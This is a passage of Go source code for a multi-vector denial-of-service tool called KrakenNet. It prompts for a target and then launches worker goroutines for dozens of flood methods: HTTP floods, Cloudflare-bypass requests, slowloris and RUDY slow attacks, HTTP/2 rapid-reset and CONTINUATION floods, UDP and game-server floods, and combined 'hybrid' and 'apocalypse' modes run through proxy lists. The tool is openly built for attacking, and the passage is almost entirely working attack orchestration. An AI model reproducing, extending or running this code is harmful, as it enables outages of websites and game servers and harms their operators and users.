	fmt.Println(Magenta+"║"+Reset+"  "+BMagenta+"FINAL STATISTICS"+Reset+strings.Repeat(" ", 38)+Magenta+"║"+Reset)
	fmt.Println(Magenta + "╠" + strings.Repeat("═", 56) + "╣" + Reset)
	fparam("Method", mode)
	fparam("Duration", fmt.Sprintf("%.0f seconds", elapsed))
	fparam("Requests", strconv.FormatInt(reqs, 10))
	fparam("Successful", strconv.FormatInt(ok, 10))
	fparam("Failed", strconv.FormatInt(fail, 10))
	fparam("Data Sent", formatBytes(float64(data)))
	fparam("Avg RPS", fmt.Sprintf("%.2f req/s", float64(reqs)/elapsed))
	fparam("Peak Bandwidth", fmt.Sprintf("%s/s", formatBytes(float64(data)/elapsed)))

	// Per-method breakdown
	methodMu.RLock()
	if len(methodCounters) > 0 {
		fmt.Println(Magenta + "╠" + strings.Repeat("═", 56) + "╣" + Reset)
		fmt.Println(Magenta+"║"+Reset+"  "+BCyan+"METHOD BREAKDOWN"+Reset+strings.Repeat(" ", 38)+Magenta+"║"+Reset)
		for m, c := range methodCounters {
			count := atomic.LoadInt64(c)
			if count > 0 {
				fparam("  "+m, strconv.FormatInt(count, 10)+" hits")
			}
		}
	}
	methodMu.RUnlock()

	fmt.Println(Magenta + "╚" + strings.Repeat("═", 56) + "╝" + Reset)
	fmt.Println()
	fmt.Println(BGreen + "[+] Attack completed." + Reset)
}

// ─────────────────────────────────────────────
//  ── LAUNCH WORKERS ──
// ─────────────────────────────────────────────

func launchWorkers(ctx context.Context, wg *sync.WaitGroup, mode, hostName string) {
	switch mode {

	// ── Core HTTP ──
	case "tls", "kraken":
		spawnRequestWorkers(ctx, wg, target, sendTLSRequest)
	case "http-flood":
		spawnRequestWorkers(ctx, wg, "http://"+hostName, sendTLSRequest)
	case "https-flood":
		spawnRequestWorkers(ctx, wg, target, sendTLSRequest)
	case "api-flood":
		spawnRequestWorkers(ctx, wg, target, apiFloodRequest)
	case "header-flood":
		spawnRequestWorkers(ctx, wg, target, headerFloodRequest)
	case "mixpost":
		spawnRequestWorkers(ctx, wg, target, mixPostRequest)
	case "cf-bypass":
		spawnRequestWorkers(ctx, wg, target, cfBypassRequest)
	case "range":
		spawnRequestWorkers(ctx, wg, target, rangeRequest)
	case "cookie-bomb":
		spawnRequestWorkers(ctx, wg, target, cookieBombRequest)

	// ── Evasion ──
	case "cache-bust":
		spawnRequestWorkers(ctx, wg, target, cacheBustRequest)
	case "cache-poison":
		spawnRequestWorkers(ctx, wg, target, cachePoisonRequest)
	case "origin-spoof":
		spawnRequestWorkers(ctx, wg, target, originSpoofRequest)
	case "etag-storm":
		spawnRequestWorkers(ctx, wg, target, etagStormRequest)
	case "accept-flood":
		spawnRequestWorkers(ctx, wg, target, acceptFloodRequest)
	case "gzip-bomb":
		spawnRequestWorkers(ctx, wg, target, gzipBombRequest)
	case "jwt-spray":
		spawnRequestWorkers(ctx, wg, target, jwtSprayRequest)
	case "graphql-depth":
		spawnRequestWorkers(ctx, wg, target, graphqlDepthRequest)
	case "multipart-exhaust":
		spawnRequestWorkers(ctx, wg, target, multipartExhaustRequest)
	case "retry-after":
		spawnRequestWorkers(ctx, wg, target, retryAfterAbuseRequest)

	// ── Slow ──
	case "slowloris":
		for i := 0; i < workers; i++ {
			wg.Add(1)
			go func() {
				defer wg.Done()
				for {
					select {
					case <-ctx.Done():
						return
					default:
						if !slowlorisOnce(target, ctx.Done()) {
							atomic.AddInt64(&totalFail, 1)
						} else {
							atomic.AddInt64(&totalReq, 1)
						}
					}
				}
			}()
		}
	case "rudy":
		for i := 0; i < workers; i++ {
			wg.Add(1)
			go func() {
				defer wg.Done()
				client := newNoTimeoutClient()
				for {
					select {
					case <-ctx.Done():
						return
					default:
						if rudyRequest(client, target, ctx.Done()) {
							atomic.AddInt64(&totalSuccess, 1)
						} else {
							atomic.AddInt64(&totalFail, 1)
						}
					}
				}
			}()
		}
	case "chunk-post":
		for i := 0; i < workers; i++ {
			wg.Add(1)
			go func() {
				defer wg.Done()
				client := newNoTimeoutClient()
				for {
					select {
					case <-ctx.Done():
						return
					default:
						if chunkPostRequest(client, target, ctx.Done()) {
							atomic.AddInt64(&totalSuccess, 1)
						} else {
							atomic.AddInt64(&totalFail, 1)
						}
					}
				}
			}()
		}

	// ── HTTP/2 ──
	case "rapid-reset":
		for i := 0; i < workers; i++ {
			wg.Add(1)
			go func() {
				defer wg.Done()
				for {
					select {
					case <-ctx.Done():
						return
					default:
						if err := rapidResetOnce(target); err != nil {
							atomic.AddInt64(&totalFail, 1)
						}
					}
				}
			}()
		}
	case "h2-cont":
		for i := 0; i < workers; i++ {
			wg.Add(1)
			go func() {
				defer wg.Done()
				for {
					select {
					case <-ctx.Done():
						return
					default:
						if err := h2ContOnce(target); err != nil {
							atomic.AddInt64(&totalFail, 1)
						}
					}
				}
			}()
		}
	case "h2-priority":
		for i := 0; i < workers; i++ {
			wg.Add(1)
			go func() {
				defer wg.Done()
				for {
					select {
					case <-ctx.Done():
						return
					default:
						if err := h2PriorityFlood(target); err != nil {
							atomic.AddInt64(&totalFail, 1)
						}
					}
				}
			}()
		}
	case "http-pipeline":
		for i := 0; i < workers; i++ {
			wg.Add(1)
			go func() {
				defer wg.Done()
				for {
					select {
					case <-ctx.Done():
						return
					default:
						if err := httpPipelineFlood(target); err != nil {
							atomic.AddInt64(&totalFail, 1)
						}
					}
				}
			}()
		}
	case "tls-fragment":
		_, h, p, _ := parseTarget(target)
		for i := 0; i < workers; i++ {
			wg.Add(1)
			go func() {
				defer wg.Done()
				for {
					select {
					case <-ctx.Done():
						return
					default:
						if err := tlsFragmentFlood(h, p); err != nil {
							atomic.AddInt64(&totalFail, 1)
						}
					}
				}
			}()
		}

	// ── WS ──
	case "ws-flood":
		for i := 0; i < workers; i++ {
			wg.Add(1)
			w := &WsFloodWorker{Target: target}
			go w.Start(ctx, wg)
		}
	case "malformed":
		for i := 0; i < workers; i++ {
			wg.Add(1)
			go func() {
				defer wg.Done()
				for {
					select {
					case <-ctx.Done():
						return
					default:
						if err := malformedOnce(target); err != nil {
							atomic.AddInt64(&totalFail, 1)
						}
					}
				}
			}()
		}

	// ── UDP ──
	case "udp-discord":
		for i := 0; i < workers; i++ {
			wg.Add(1)
			w := &UDPDiscordWorker{Target: hostName, Port: port}
			go w.Start(ctx, wg)
		}
	case "udp-bypass":
		for i := 0; i < workers; i++ {
			wg.Add(1)
			w := &UDPBypassWorker{Target: hostName, Port: port}
			go w.Start(ctx, wg)
		}
	case "udp-gbps":
		var pktSize int
		fmt.Print(Yellow + "Packet size (bytes, 50-1400): " + Reset)
		fmt.Scanf("%d\n", &pktSize)
		if pktSize < 50 || pktSize > 1400 {
			pktSize = 1400
		}
		for i := 0; i < workers; i++ {
			wg.Add(1)
			w := &UDPGbpsWorker{Target: hostName, Port: port, Size: pktSize}
			go w.Start(ctx, wg)
		}
	case "fivem":
		var uploadMbps float64
		fmt.Print(Yellow + "Upload in Mbps (e.g., 0.84): " + Reset)
		fmt.Scanf("%f\n", &uploadMbps)
		if uploadMbps <= 0 {
			uploadMbps = 1.0
		}
		burst := int(uploadMbps * 1_000_000 / 120)
		for i := 0; i < workers; i++ {
			wg.Add(1)
			w := &FivemWorker{Target: hostName, Port: port, Burst: burst}
			go w.Start(ctx, wg)
		}
	case "minecraft":
		for i := 0; i < connections; i++ {
			wg.Add(1)
			go func() {
				defer wg.Done()
				minecraftWorker(ctx, hostName, port)
			}()
		}

	// ── ULTIMATE ──
	case "hybrid":
		// 6 vectors: cf-bypass, api-flood, ws-flood, rapid-reset, graphql-depth, cache-bust
		sixth := workers / 6
		if sixth < 1 {
			sixth = 1
		}
		vectors := []requestFunc{cfBypassRequest, apiFloodRequest, graphqlDepthRequest, cacheBustRequest, jwtSprayRequest, originSpoofRequest}
		for _, fn := range vectors {
			fn := fn
			for i := 0; i < sixth; i++ {
				wg.Add(1)
				go func() {
					defer wg.Done()
					client := newHTTPClientTLSWithProxy(randomFromList(proxies, ""), connections)
					for {
						select {
						case <-ctx.Done():
							return
						default:
							for j := 0; j < connections; j++ {
								if fn(client, target) {
									atomic.AddInt64(&totalSuccess, 1)
								} else {
									atomic.AddInt64(&totalFail, 1)
								}
							}
						}
					}
				}()
			}
		}
		for i := 0; i < sixth; i++ {
			wg.Add(1)
			w := &WsFloodWorker{Target: target}
			go w.Start(ctx, wg)
		}
		for i := 0; i < sixth; i++ {
			wg.Add(1)
			go func() {
				defer wg.Done()
				for {
					select {
					case <-ctx.Done():
						return
					default:
						rapidResetOnce(target)
					}
				}
			}()
		}

	case "apocalypse":
		// All 14 HTTP vectors + rapid-reset + h2-cont + h2-priority + slowloris + rudy + ws-flood
		httpVectors := []requestFunc{
			sendTLSRequest, apiFloodRequest, cfBypassRequest, headerFloodRequest,
			mixPostRequest, rangeRequest, cookieBombRequest,
			cacheBustRequest, cachePoisonRequest, originSpoofRequest,
			etagStormRequest, acceptFloodRequest, gzipBombRequest,
			jwtSprayRequest, graphqlDepthRequest, multipartExhaustRequest,
			retryAfterAbuseRequest,
		}
		perVector := workers / len(httpVectors)
		if perVector < 1 {
			perVector = 1
		}
		for _, fn := range httpVectors {
			fn := fn
			for i := 0; i < perVector; i++ {
				wg.Add(1)
				go func() {
					defer wg.Done()
					client := newHTTPClientTLSWithProxy(randomFromList(proxies, ""), connections)
					for {
						select {
						case <-ctx.Done():
							return
						default:
							for j := 0; j < connections; j++ {
								if fn(client, target) {
									atomic.AddInt64(&totalSuccess, 1)
								} else {
									atomic.AddInt64(&totalFail, 1)
								}
							}
						}
					}
				}()
			}
		}
		// + H2 workers
		for i := 0; i < 2; i++ {
			wg.Add(1)
			go func() {
				defer wg.Done()
				for {
					select {
					case <-ctx.Done():
						return
					default:
						rapidResetOnce(target)
					}
				}
			}()
			wg.Add(1)
			go func() {
				defer wg.Done()
				for {
					select {
					case <-ctx.Done():
						return
					default:
						h2ContOnce(target)
					}
				}
			}()
			wg.Add(1)
			go func() {
				defer wg.Done()
				for {
					select {
					case <-ctx.Done():
						return
					default:
						h2PriorityFlood(target)
					}
				}
			}()
		}
		// + slow
		for i := 0; i < 2; i++ {
			wg.Add(1)
			go func() {
				defer wg.Done()
				client := newNoTimeoutClient()
				for {
					select {
					case <-ctx.Done():
						return
					default:
						rudyRequest(client, target, ctx.Done())
					}
				}
			}()
			wg.Add(1)
			go func() {
				defer wg.Done()
				for {
					select {
					case <-ctx.Done():
						return
					default:
						slowlorisOnce(target, ctx.Done())
					}
				}
			}()
		}
		// + WS
		for i := 0; i < 2; i++ {
			wg.Add(1)
			w := &WsFloodWorker{Target: target}
			go w.Start(ctx, wg)
		}

	default:
		fmt.Println(BRed + "[-] Unknown method: " + mode + Reset)
	}
}

// ─────────────────────────────────────────────
//  ── MAIN ATTACK LOOP ──
// ─────────────────────────────────────────────

func runAttack() {
	reader := bufio.NewReader(os.Stdin)

	userAgents = loadListFromFile("useragent.txt")
	referers = loadListFromFile("referers.txt")
	proxies = loadListFromFile("http.txt")
	if len(userAgents) == 0 {
		userAgents = defaultUserAgents
	}
	if len(referers) == 0 {
		referers = defaultReferers
	}

	fmt.Print(Yellow + "Target (URL or IP): " + Reset)
	rawTarget, _ := reader.ReadString('\n')
	target = strings.TrimSpace(rawTarget)
	if target == "" {
		return
	}
	if !strings.HasPrefix(target, "http://") && !strings.HasPrefix(target, "https://") {
		target = "https://" + target
	}
	_, hostName, _, _ := parseTarget(target)

	printMenu()

	fmt.Print(Yellow + "Select method: " + Reset)
	mode, _ := reader.ReadString('\n')
	mode = strings.TrimSpace(strings.ToLower(mode))

	fmt.Print(Yellow + "Connections per worker: " + Reset)
	fmt.Scanf("%d\n", &connections)
	fmt.Print(Yellow + "Number of workers: " + Reset)
	fmt.Scanf("%d\n", &workers)
	fmt.Print(Yellow + "Port (UDP/game only, 0 = 443): " + Reset)
	fmt.Scanf("%d\n", &port)
	fmt.Print(Yellow + "Duration (seconds): " + Reset)
	fmt.Scanf("%d\n", &durationSec)

	if connections < 1 {
		connections = 10
	}
	if workers < 1 {
		workers = 10
	}
	if port < 1 {
		port = 443
	}
	if durationSec < 1 {
		durationSec = 30
	}

	// Reset counters
	atomic.StoreInt64(&totalSuccess, 0)
	atomic.StoreInt64(&totalFail, 0)
	atomic.StoreInt64(&totalBytes, 0)
	atomic.StoreInt64(&totalReq, 0)
	methodMu.Lock()
	methodCounters = make(map[string]*int64)
	methodMu.Unlock()

	// Mission parameters display
	fmt.Println()
	fmt.Println(Cyan + "╔" + strings.Repeat("═", 56) + "╗" + Reset)
	fmt.Println(Cyan+"║"+Reset+"  "+BCyan+"MISSION PARAMETERS"+Reset+strings.Repeat(" ", 36)+Cyan+"║"+Reset)
	fmt.Println(Cyan + "╠" + strings.Repeat("═", 56) + "╣" + Reset)
	mparam("Target", target, BWhite)
	mparam("Method", mode, BYellow)
	mparam("Workers", strconv.Itoa(workers), BWhite)
	mparam("Connections", strconv.Itoa(connections), BWhite)
	mparam("Port", strconv.Itoa(port), BWhite)
	mparam("Duration", strconv.Itoa(durationSec)+" seconds", BWhite)
	mparam("Proxies", strconv.Itoa(len(proxies))+" loaded", BWhite)
	mparam("UserAgents", strconv.Itoa(len(userAgents))+" loaded", BWhite)
	fmt.Println(Cyan + "╚" + strings.Repeat("═", 56) + "╝" + Reset)
	fmt.Println()
	fmt.Println(BGreen + "[+] Deploying attack workers..." + Reset)

	ctx, cancel := context.WithTimeout(context.Background(), time.Duration(durationSec)*time.Second)
	defer cancel()
	var wg sync.WaitGroup

	attackStart = time.Now()
	go statsReporter(ctx, mode)

	launchWorkers(ctx, &wg, mode, hostName)
	wg.Wait()
	printFinalStats(mode)
}

// ─────────────────────────────────────────────
//  ── ENTRY POINT ──
// ─────────────────────────────────────────────

func main() {
	rand.Seed(time.Now().UnixNano())
	fmt.Print("\033[2J\033[H")
	printBanner()
	reader := bufio.NewReader(os.Stdin)

	// Suppress unused import warning for json — used in hybrid mode for future extension
	_ = json.Marshal

	for {
		runAttack()
		fmt.Print(Yellow + "\nStart another attack? (y/n): " + Reset)
		again, _ := reader.ReadString('\n')
		again = strings.TrimSpace(strings.ToLower(again))
		if again != "y" {
			fmt.Println(BGreen + "[+] KrakenNet stopped. Goodbye." + Reset)
			break
		}
		fmt.Print("\033[2J\033[H")
		printBanner()
	}
}
